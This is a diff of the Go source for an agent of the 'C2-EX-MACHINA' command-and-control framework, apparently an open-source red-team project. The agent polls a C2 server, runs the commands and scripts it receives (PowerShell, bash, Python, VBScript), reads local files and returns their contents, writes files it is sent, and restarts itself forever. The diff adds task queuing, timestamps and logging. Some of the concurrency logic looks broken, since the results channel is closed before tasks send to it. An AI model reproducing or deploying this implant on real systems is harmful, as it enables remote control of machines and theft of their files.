@@ -21,24 +21,27 @@
 package main
 
 import (
-	"encoding/json"
-	"io/ioutil"
-	"net/http"
-	"runtime"
-	"os/exec"
-	"strings"
-	"strconv"
-	"context"
 	"bytes"
-	"time"
+	"container/list"
+	"context"
+	"encoding/json"
 	"fmt"
-	"log"
-	"os"
 	"io"
+	"io/ioutil"
+	"log"
+	"math/rand"
+	"net/http"
+	"net/url"
+	"os"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"strings"
+	"time"
 )
 
 var authors = [2]string{"evaris237", "KrysCat-KitKat"}
-var url = "https://github.com/C2-EX-MACHINA/Agent/"
+var _url = "https://github.com/C2-EX-MACHINA/Agent/"
 var license = "GPL-3.0 License"
 var version = "0.0.1"
 
@@ -49,7 +52,8 @@ This is free software, and you are welcome to redistribute it
 under certain conditions.
 `
 
-var is_windows = runtime.GOOS == "windows"
+const is_windows = runtime.GOOS == "windows"
+const key_characters = "KEbB+<U@D]Z}-NA\\m!au)cq6[iWVlv,3hj50ro2(>ITGt8Q.dzXSL*&|w_p=MPk4xsJ9R{y1efY^FO7n$gHC"
 
 /*
 	LevelLogger is a Logger that manage levels
@@ -57,21 +61,21 @@ var is_windows = runtime.GOOS == "windows"
 */
 type LevelLogger struct {
 	*log.Logger
-	level int
+	level  int
 	format string
 	levels map[int]string
 }
 
 /*
-	THis function makes the default logger.
+	This function makes the default logger.
 
 	format:
 	[%(date)] %(levelname) \t(%(levelvalue)) \{\{%(file):%(line)\}\} :: %(message)
 */
-func DefaultLogger () LevelLogger {
+func DefaultLogger() LevelLogger {
 	logger := LevelLogger{
 		log.Default(),
-		0,	 // 0 -> all logs (lesser than DEBUG (10) level)
+		0, // 0 -> all logs (lesser than DEBUG (10) level)
 		"\b] %(levelname) \t(%(levelvalue)) {{%(file):%(line)}} :: %s",
 		make(map[int]string),
 	}
@@ -90,7 +94,7 @@ func DefaultLogger () LevelLogger {
 /*
 	This function logs messages to stderr.
 */
-func (logger *LevelLogger) log (level int, message string) {
+func (logger *LevelLogger) log(level int, message string) {
 	if level < logger.level {
 		return
 	}
@@ -115,7 +119,9 @@ func (logger *LevelLogger) log (level int, message string) {
 	}
 
 	if strings.Contains(logstring, "%(line)") {
-		logstring = strings.Replace(logstring, "%(line)", strconv.Itoa(line), -1)
+		logstring = strings.Replace(
+			logstring, "%(line)", strconv.Itoa(line), -1,
+		)
 	}
 
 	logger.Printf(logstring, message)
@@ -124,35 +130,35 @@ func (logger *LevelLogger) log (level int, message string) {
 /*
 	This function logs debug message.
 */
-func (logger *LevelLogger) debug (message string) {
+func (logger *LevelLogger) debug(message string) {
 	logger.log(10, message)
 }
 
 /*
 	This function logs info message.
 */
-func (logger *LevelLogger) info (message string) {
+func (logger *LevelLogger) info(message string) {
 	logger.log(20, message)
 }
 
 /*
 	This function logs warning message.
 */
-func (logger *LevelLogger) warning (message string) {
+func (logger *LevelLogger) warning(message string) {
 	logger.log(30, message)
 }
 
 /*
 	This function logs error message.
 */
-func (logger *LevelLogger) error (message string) {
+func (logger *LevelLogger) error(message string) {
 	logger.log(40, message)
 }
 
 /*
 	This function logs critical message.
 */
-func (logger *LevelLogger) critical (message string) {
+func (logger *LevelLogger) critical(message string) {
 	logger.log(50, message)
 }
 
@@ -162,16 +168,78 @@ var logger = DefaultLogger()
 	This type is a task result to store results in a single object.
 */
 type TaskResult struct {
-	id int
-	stdout string
-	stderr string
-	exit_code int
+	id         int
+	stdout     string
+	stderr     string
+	exit_code  int
+	start_time int
+	end_time   int
 }
 
 /*
-	This function execute a process.
+	This interface defines Queue based on
+	container/list object.
 */
-func executeProcess(timeout int, launcher string, arguments ...string) (string, string, int) {
+type Queue interface {
+	Front() *list.Element
+	Len() int
+	push(map[string]interface{})
+	pop() *list.Element
+}
+
+/*
+	This struct is the Queue Implementation based
+	on the container/list object.
+*/
+type QueueImplementation struct {
+	*list.List
+}
+
+/*
+	This function is a wrapper for container/list.PushBack
+	function for Queue Implentation.
+*/
+func (queue *QueueImplementation) push(value map[string]interface{}) {
+	queue.PushBack(value)
+}
+
+/*
+	This function gets the next element of the Queue
+	and remove it.
+*/
+func (queue *QueueImplementation) pop() *list.Element {
+	minimum := queue.Front()
+	minimum_value := minimum.Value.(map[string]interface{})["Timestamp"].(int)
+
+	for element := minimum; element != nil; element = element.Next() {
+		value := element.Value.(map[string]interface{})["Timestamp"].(int)
+		if value < minimum_value {
+			minimum_value = value
+			minimum = element
+		}
+	}
+
+	queue.List.Remove(minimum)
+	return minimum
+}
+
+var tasks_queue map[int]Queue
+
+/*
+	This function is like a constructor for Queue.
+*/
+func newQueue() Queue {
+	return &QueueImplementation{list.New()}
+}
+
+/*
+	This function executes a child process (launchs
+	command line, executes a script, ect...) and returns
+	output, error, exit code, start time and end time.
+*/
+func executeProcess(
+	timeout int, launcher string, arguments ...string,
+) (string, string, int, int, int) {
 	var stdout, stderr bytes.Buffer
 	var cmd *exec.Cmd
 
@@ -182,7 +250,7 @@ func executeProcess(timeout int, launcher string, arguments ...string) (string, 
 		logger.debug("Create subprocess with timeout")
 		ctx, cancel := context.WithTimeout(
 			context.Background(),
-			time.Duration(timeout) * time.Second,
+			time.Duration(timeout)*time.Second,
 		)
 		defer cancel()
 		cmd = exec.CommandContext(ctx, launcher, arguments...)
@@ -190,10 +258,14 @@ func executeProcess(timeout int, launcher string, arguments ...string) (string, 
 
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
+
+	start_time := int(time.Now().Unix())
 	error := cmd.Run()
+	end_time := int(time.Now().Unix())
+
 	exit_code := cmd.ProcessState.ExitCode()
 	logger.debug("Subprocess terminated.")
-	
+
 	if error != nil {
 		error_message := error.Error()
 		logger.warning(
@@ -203,31 +275,34 @@ func executeProcess(timeout int, launcher string, arguments ...string) (string, 
 				error_message,
 			),
 		)
-		return "", error_message, exit_code
+		return "", error_message, exit_code, start_time, end_time
 	}
-	
-	return stdout.String(), stderr.String(), exit_code
+
+	return stdout.String(), stderr.String(), exit_code, start_time, end_time
 }
 
 /*
-	This function performs MEMORYSCRIPT tasks.
+	This function performs MEMORYSCRIPT tasks and returns the
+	task result.
 */
-func processScriptMemoryTask(task map[string]interface{}) (TaskResult) {
+func processScriptMemoryTask(task map[string]interface{}) TaskResult {
 	launcher, _, arguments := getLauncherAndProperties(
 		task["Filename"].(string), true,
 	)
 
-	stdout, stderr, exit_code := executeProcess(
+	stdout, stderr, exit_code, start_time, end_time := executeProcess(
 		getTimeout(task), launcher, arguments...,
 	)
 
-	return TaskResult{task["id"].(int), stdout, stderr, exit_code}
+	return TaskResult{
+		task["id"].(int), stdout, stderr, exit_code, start_time, end_time,
+	}
 }
 
 /*
-	This function performs SCRIPT tasks.
+	This function performs SCRIPT tasks and returns the task result.
 */
-func processScriptTask(task map[string]interface{}) (TaskResult) {
+func processScriptTask(task map[string]interface{}) TaskResult {
 	launcher, extension, arguments := getLauncherAndProperties(
 		task["Filename"].(string), false,
 	)
@@ -235,26 +310,29 @@ func processScriptTask(task map[string]interface{}) (TaskResult) {
 	filename, error := writeTempfile(extension, task["Data"].(string))
 
 	if error != "" {
-		return TaskResult{task["id"].(int), "", error, 1}
+		timestamp := int(time.Now().Unix())
+		return TaskResult{task["id"].(int), "", error, 1, timestamp, timestamp}
 	}
 
 	arguments = append(arguments, filename)
 	defer os.Remove(filename)
 
-	stdout, stderr, exit_code := executeProcess(
+	stdout, stderr, exit_code, start_time, end_time := executeProcess(
 		getTimeout(task), launcher, arguments...,
 	)
 
-	return TaskResult{task["id"].(int), stdout, stderr, exit_code}
+	return TaskResult{
+		task["id"].(int), stdout, stderr, exit_code, start_time, end_time,
+	}
 }
 
 /*
-	This function writes temp file.
+	This function writes temp file and returns the filemame.
 */
 func writeTempfile(extension string, content string) (string, string) {
 	logger.debug(fmt.Sprintf("Write temp file with %s extension", extension))
 	file, error := os.CreateTemp("", fmt.Sprintf("*%s", extension))
-	
+
 	if error != nil {
 		error_message := fmt.Sprintf(
 			"Error creating temp file: %s", error.Error(),
@@ -284,9 +362,12 @@ func writeTempfile(extension string, content string) (string, string) {
 }
 
 /*
-	This function defines launcher, file extension and arguments for subprocess.
+	This function defines launcher, file extension and
+	arguments for subprocess.
 */
-func getLauncherAndProperties(launcher string, in_memory bool) (string, string, []string) {
+func getLauncherAndProperties(
+	launcher string, in_memory bool,
+) (string, string, []string) {
 	var arguments []string
 	var extension string
 
@@ -295,65 +376,65 @@ func getLauncherAndProperties(launcher string, in_memory bool) (string, string, 
 			"Defined launcher for in memory execution with %s", launcher,
 		))
 		switch launcher {
-			case "powershell":
-				launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-			case "python3":
-				launcher = "/bin/python3"
-				arguments = append(arguments, "-c")
-			case "python":
-				launcher = "/bin/python"
-				arguments = append(arguments, "-c")
-			case "python2":
-				launcher = "/bin/python2"
-				arguments = append(arguments, "-c")
-			case "perl":
-				launcher = "/bin/perl"
-				arguments = append(arguments, "-E")
-			case "bash":
-				launcher = "/bin/bash"
-				arguments = append(arguments, "-c")
-			case "shell":
-				launcher = "/bin/shell"
-				arguments = append(arguments, "-c")
-			case "batch":
-				launcher = "C:\\Windows\\System32\\cmd.exe"
-				arguments = append(arguments, "/c")
+		case "powershell":
+			launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+		case "python3":
+			launcher = "/bin/python3"
+			arguments = append(arguments, "-c")
+		case "python":
+			launcher = "/bin/python"
+			arguments = append(arguments, "-c")
+		case "python2":
+			launcher = "/bin/python2"
+			arguments = append(arguments, "-c")
+		case "perl":
+			launcher = "/bin/perl"
+			arguments = append(arguments, "-E")
+		case "bash":
+			launcher = "/bin/bash"
+			arguments = append(arguments, "-c")
+		case "shell":
+			launcher = "/bin/shell"
+			arguments = append(arguments, "-c")
+		case "batch":
+			launcher = "C:\\Windows\\System32\\cmd.exe"
+			arguments = append(arguments, "/c")
 		}
 	} else {
 		logger.debug(fmt.Sprintf(
 			"Defined launcher and extension for execution with %s", launcher,
 		))
 		switch launcher {
-			case "powershell":
-				launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-				extension = "ps1"
-			case "python3":
-				launcher = "/bin/python3"
-				extension = "py"
-			case "python":
-				launcher = "/bin/python"
-				extension = "py"
-			case "python2":
-				launcher = "/bin/python2"
-				extension = "py"
-			case "perl":
-				launcher = "/bin/perl"
-				extension = "pl"
-			case "bash":
-				launcher = "/bin/bash"
-				extension = "sh"
-			case "shell":
-				launcher = "/bin/shell"
-				extension = "sh"
-			case "batch":
-				launcher = "C:\\Windows\\System32\\cmd.exe"
-				extension = "bat"
-			case "vbscript":
-				launcher = "C:\\Windows\\System32\\cscript.exe"
-				extension = "vbs"
-			case "jscript":
-				launcher = "C:\\Windows\\System32\\cscript.exe"
-				extension = "js"
+		case "powershell":
+			launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+			extension = "ps1"
+		case "python3":
+			launcher = "/bin/python3"
+			extension = "py"
+		case "python":
+			launcher = "/bin/python"
+			extension = "py"
+		case "python2":
+			launcher = "/bin/python2"
+			extension = "py"
+		case "perl":
+			launcher = "/bin/perl"
+			extension = "pl"
+		case "bash":
+			launcher = "/bin/bash"
+			extension = "sh"
+		case "shell":
+			launcher = "/bin/shell"
+			extension = "sh"
+		case "batch":
+			launcher = "C:\\Windows\\System32\\cmd.exe"
+			extension = "bat"
+		case "vbscript":
+			launcher = "C:\\Windows\\System32\\cscript.exe"
+			extension = "vbs"
+		case "jscript":
+			launcher = "C:\\Windows\\System32\\cscript.exe"
+			extension = "js"
 		}
 	}
 
@@ -363,7 +444,7 @@ func getLauncherAndProperties(launcher string, in_memory bool) (string, string, 
 /*
 	This function returns a timeout from task (optional in JSON).
 */
-func getTimeout(task map[string]interface{}) (int) {
+func getTimeout(task map[string]interface{}) int {
 	temp_timeout := task["Timeout"]
 	timeout, ok := temp_timeout.(int)
 
@@ -376,21 +457,10 @@ func getTimeout(task map[string]interface{}) (int) {
 }
 
 /*
-	processCommandTask traite les tâches de type commande et retourne le stdout,
-	le stderr et le status de la tâche.
-	Elle retourne une erreur si la commande n'a pas pu être exécutée.
-
-	Args:
-	- task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data"
-		contenant la commande à exécuter
-
-	Returns:
-	- stdout: le résultat de la commande exécutée (stdout)
-	- stderr: le résultat d'erreurs générées par la commande (stderr)
-	- exitCode: le code de sortie de la commande
-	- err: une erreur éventuelle rencontrée lors de l'exécution de la commande
+	This function starts the cross platform command task
+	and returns the results.
 */
-func processCommandTask(task map[string]interface{}) (TaskResult) {
+func processCommandTask(task map[string]interface{}) TaskResult {
 	var launcher string
 	var arguments []string
 
@@ -406,34 +476,28 @@ func processCommandTask(task map[string]interface{}) (TaskResult) {
 	)
 
 	arguments = append(arguments, command_string)
-	stdout, stderr, exit_code := executeProcess(
+	stdout, stderr, exit_code, start_time, end_time := executeProcess(
 		getTimeout(task), launcher, arguments...,
 	)
 
-	return TaskResult{task["id"].(int), stdout, stderr, exit_code}
+	return TaskResult{
+		task["id"].(int), stdout, stderr, exit_code, start_time, end_time,
+	}
 }
 
 /*
-	processUploadTask traite les tâches de type "upload" et retourne le contenu
-	du fichier.
-
-	Args:
-	- task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data"
-	contenant le chemin vers le fichier à lire
-
-	Returns:
-	- fileContent: le contenu du fichier lu
-	- stderr: une chaîne vide
-	- exitCode: 0 (pas d'erreur rencontrée)
-	- err: une erreur éventuelle rencontrée lors de la lecture du fichier
+	This function downloads the file on the remote
+	server and returns the task result.
 */
-func processDownloadTask(task map[string]interface{}) (TaskResult) {
+func processDownloadTask(task map[string]interface{}) TaskResult {
 	filename := task["Data"].(string)
 	logger.info(
 		fmt.Sprintf("Performs DOWNLOAD task: %s", filename),
 	)
 
+	start_time := int(time.Now().Unix())
 	fileContent, error := ioutil.ReadFile(filename)
+	end_time := int(time.Now().Unix())
 	logger.debug("File read")
 
 	if error != nil {
@@ -444,34 +508,29 @@ func processDownloadTask(task map[string]interface{}) (TaskResult) {
 				error_message,
 			),
 		)
-		return TaskResult{task["id"].(int), "", error_message, 1}
+		return TaskResult{
+			task["id"].(int), "", error_message, 1, start_time, end_time,
+		}
 	}
 
-	return TaskResult{task["id"].(int), string(fileContent), "", 0}
+	return TaskResult{
+		task["id"].(int), string(fileContent), "", 0, start_time, end_time,
+	}
 }
 
 /*
-	processDownloadTask traite les tâches de type "download" et écrit le contenu
-	reçu dans un fichier.
-
-	Args:
-	- task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data"
-		contenant le contenu à écrire dans le fichier et une clé "Filename"
-		contenant le nom du fichier
-
-	Returns:
-	- stdout: une chaîne vide
-	- stderr: une chaîne vide
-	- exitCode: 0 (pas d'erreur rencontrée)
-	- err: une erreur éventuelle rencontrée lors de l'écriture dans le fichier
+	This function uploads the file on the local
+	machine and returns the task result.
 */
-func processUploadTask(task map[string]interface{}) (TaskResult) {
+func processUploadTask(task map[string]interface{}) TaskResult {
 	filename := task["Filename"].(string)
 	logger.info(
 		fmt.Sprintf("Performs UPLOAD task: %s", filename),
 	)
 
+	start_time := int(time.Now().Unix())
 	error := ioutil.WriteFile(filename, []byte(task["Data"].(string)), 0600)
+	end_time := int(time.Now().Unix())
 	logger.debug("File written.")
 
 	if error != nil {
@@ -482,48 +541,94 @@ func processUploadTask(task map[string]interface{}) (TaskResult) {
 				error_message,
 			),
 		)
-		return TaskResult{task["id"].(int), "", error_message, 1}
+		return TaskResult{
+			task["id"].(int), "", error_message, 1, start_time, end_time,
+		}
 	}
 
-	return TaskResult{task["id"].(int), "", "", 0}
+	return TaskResult{task["id"].(int), "", "", 0, start_time, end_time}
 }
 
 /*
-	cette fonction permet de traiter les taches
-	elle retourne le stdout, le stderr et le status de la tache
-	elle retourne une erreur si le type de tache n'est pas reconnu
+	This function generates Queue for a task
+	if the task should be executed after another task.
+*/
+func generateQueue(task map[string]interface{}) bool {
+	after := task["After"].(int)
+	if after > 0 {
+		_, ok := tasks_queue[after]
+		if !ok {
+			tasks_queue[after] = newQueue()
+		}
+		tasks_queue[after].push(task)
+		return false
+	}
+
+	return true
+}
+
+/*
+	This function executes all tasks in the
+	Queue of the current task if exist.
+*/
+func executeQueue(task map[string]interface{}, results chan TaskResult) {
+	id := task["Id"].(int)
+	queue, ok := tasks_queue[id]
+
+	if !ok {
+		return
+	}
+
+	for queue.Len() > 0 {
+		new_task := queue.pop().Value.(map[string]interface{})
+		go processTask(new_task, results)
+	}
+}
+
+/*
+	This function executes the function for each
+	tasks by task types and returns the tasks results.
 */
 func processTask(task map[string]interface{}, results chan TaskResult) {
+	if !generateQueue(task) {
+		return
+	}
+
 	time_to_wait(task["Timestamp"].(int64))
 	type_ := task["Type"].(string)
 	logger.debug(fmt.Sprintf("Receive %s task", type_))
 
 	switch type_ {
-		case "COMMAND":
-			results <- processCommandTask(task)
-			return
-		case "UPLOAD":
-			results <- processUploadTask(task)
-			return
-		case "DOWNLOAD":
-			results <- processDownloadTask(task)
-			return
-		case "MEMORYSCRIPT":
-			results <- processScriptMemoryTask(task)
-			return
-		case "TEMPSCRIPT":
-			results <- processScriptTask(task)
-			return
+	case "COMMAND":
+		results <- processCommandTask(task)
+		return
+	case "UPLOAD":
+		results <- processUploadTask(task)
+		return
+	case "DOWNLOAD":
+		results <- processDownloadTask(task)
+		return
+	case "MEMORYSCRIPT":
+		results <- processScriptMemoryTask(task)
+		return
+	case "TEMPSCRIPT":
+		results <- processScriptTask(task)
+		return
 	}
 
 	logger.error("Invalid task type")
-	results <- TaskResult{task["id"].(int), "", "Invalid task type", 1}
+	timestamp := int(time.Now().Unix())
+	results <- TaskResult{
+		task["id"].(int), "", "Invalid task type", 1, timestamp, timestamp,
+	}
+
+	executeQueue(task, results)
 }
 
 /*
 	This function adds C2-EX-MACHINA headers to request object.
 */
-func addDefaultHeaders (request *http.Request) {
+func addDefaultHeaders(request *http.Request) {
 	hostname, error := os.Hostname()
 
 	if error != nil {
@@ -538,8 +643,8 @@ func addDefaultHeaders (request *http.Request) {
 	request.Header.Set("Content-Type", "application/json; charset=utf-8")
 	request.Header.Set(
 		"Api-Key",
-		"AdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin" +
-		"AdminAdminAdminAdminAdminAdminAdmin",
+		"AdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin"+
+			"AdminAdminAdminAdminAdminAdminAdmin",
 	)
 	request.Header.Set(
 		"User-Agent",
@@ -554,14 +659,25 @@ func addDefaultHeaders (request *http.Request) {
 }
 
 /*
+	This function generates a new random key.
+*/
+func generate_key() string {
+	key := make([]byte, 255)
+	for index := range key {
+		key[index] = key_characters[rand.Intn(len(key_characters))]
+	}
+	return string(key)
+}
+
+/*
 	This function creates HTTP request object.
 */
-func createRequest (method string, body io.Reader) (*http.Request) {
+func createRequest(method string, body io.Reader) *http.Request {
 	request, error := http.NewRequest(
 		method,
-		"http://127.0.0.1:8000/c2/order/01223456789abcdef",
+		"http://127.0.0.1:8000/c2/order/"+url.QueryEscape(generate_key()),
 		body,
-	) // bug with nil body, example: https://pkg.go.dev/net/http
+	)
 
 	if error != nil {
 		logger.error(fmt.Sprintf("Error creating request: %s", error.Error()))
@@ -575,7 +691,7 @@ func createRequest (method string, body io.Reader) (*http.Request) {
 /*
 	This function sends HTTP request and returns the response body content.
 */
-func sendRequest (request *http.Request, client *http.Client) ([]byte) {
+func sendRequest(request *http.Request, client *http.Client) []byte {
 	response, error := client.Do(request)
 	if error != nil {
 		logger.error(fmt.Sprintf("Error sending request: %s", error.Error()))
@@ -588,7 +704,9 @@ func sendRequest (request *http.Request, client *http.Client) ([]byte) {
 	logger.debug("Read the response body")
 	content, error := ioutil.ReadAll(response.Body)
 	if error != nil {
-		logger.error(fmt.Sprintf("Error reading response body: %s", error.Error()))
+		logger.error(fmt.Sprintf(
+			"Error reading response body: %s", error.Error(),
+		))
 		time.Sleep(5 * time.Second)
 		return sendRequest(request, client)
 	}
@@ -599,7 +717,7 @@ func sendRequest (request *http.Request, client *http.Client) ([]byte) {
 /*
 	This function parses tasks, executes it and generates the response.
 */
-func processTasks (tasks []interface{}) ([]byte) {
+func processTasks(tasks []interface{}, file *os.File) []byte {
 	var body []map[string]interface{}
 	logger.debug("Parse JSON")
 
@@ -614,14 +732,17 @@ func processTasks (tasks []interface{}) ([]byte) {
 			go processTask(taskMap, results)
 		}
 	}
-
+	// Close the results channel to indicate that no more results will be sent
+	close(results)
 	for result := range results {
 		logger.debug("Generate a task result")
 		body = append(body, map[string]interface{}{
-			"id":	 result.id,
-			"stdout": result.stdout,
-			"stderr": result.stderr,
-			"status": result.exit_code,
+			"Id":        result.id,
+			"Stdout":    result.stdout,
+			"Stderr":    result.stderr,
+			"Status":    result.exit_code,
+			"StartTime": result.start_time,
+			"EndTime":   result.end_time,
 		})
 	}
 
@@ -635,6 +756,8 @@ func processTasks (tasks []interface{}) ([]byte) {
 		)
 		return nil
 	}
+
+	addJsonLog(file, string(data))
 	return data
 }
 
@@ -650,18 +773,62 @@ func time_to_wait(epoch int64) {
 }
 
 /*
-	cette fonction permet de lancer l'agent
-	elle est appelee par la fonction main
-	elle contient une boucle infinie qui permet de traiter les taches
-	elle retourne une erreur si la requete n'a pas pu etre executee
-	le header de la requete contient l'api-key, le user-agent et le content-type
-	la requete GET permet de recuperer les taches a traiter
-	la requete POST permet d'envoyer les resultats des taches traitees
+	This function open a log file.
+*/
+func openLogFile(filename string) *os.File {
+	file, error := os.OpenFile(
+		filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600,
+	)
 
+	if error != nil {
+		panic(error)
+	}
+
+	return file
+}
+
+/*
+	This function adds a new online JSON object to a JSON log file.
+*/
+func addJsonLog(file *os.File, data string) {
+	_, error := file.WriteString(data + "\n")
+	if error != nil {
+		logger.error(
+			fmt.Sprintf(
+				"Error writing new JSON log in file: %s (%s)",
+				error.Error(),
+				data,
+			),
+		)
+		return
+	}
+
+	error = file.Sync()
+	if error != nil {
+		logger.error(
+			fmt.Sprintf(
+				"Error writing new JSON log in file: %s (%s)",
+				error.Error(),
+				data,
+			),
+		)
+		return
+	}
+}
+
+/*
+	This function starts the agent and loop until there is
+	no error to request, execute and send tasks output to
+	server from the local machine.
 */
 func runAgent() {
 	logger.debug("Start agent")
 	client := &http.Client{}
+
+	tasks_log_file := openLogFile("tasks.json")
+	defer tasks_log_file.Close()
+	results_log_file := openLogFile("results.json")
+	defer results_log_file.Close()
 
 	logger.debug("Create first request")
 	request := createRequest("GET", nil)
@@ -669,6 +836,8 @@ func runAgent() {
 	content := sendRequest(request, client)
 
 	for {
+		addJsonLog(tasks_log_file, string(content))
+
 		var order map[string]interface{}
 		error := json.Unmarshal(content, &order)
 		if error != nil {
@@ -678,7 +847,7 @@ func runAgent() {
 			return
 		}
 
-		data := processTasks(order["Tasks"].([]interface{}))
+		data := processTasks(order["Tasks"].([]interface{}), results_log_file)
 		if data == nil {
 			return
 		}
@@ -692,7 +861,8 @@ func runAgent() {
 }
 
 /*
-	This function starts the C2-EX-MACHINA agent.
+	This function starts the C2-EX-MACHINA agent
+	and run it for ever.
 */
 func main() {
 	fmt.Println(copyright)
@@ -704,7 +874,7 @@ func main() {
 	██║░░██╗██╔══╝░░╚════╝██╔══╝░░░██╔██╗░╚════╝██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║██║██║╚████║██╔══██║
 	╚█████╔╝███████╗░░░░░░███████╗██╔╝╚██╗░░░░░░██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║██║██║░╚███║██║░░██║
 	░╚════╝░╚══════╝░░░░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝`)
-	
+
 	for {
 		runAgent()
 		logger.warning("Run agent end, restarting agent...")
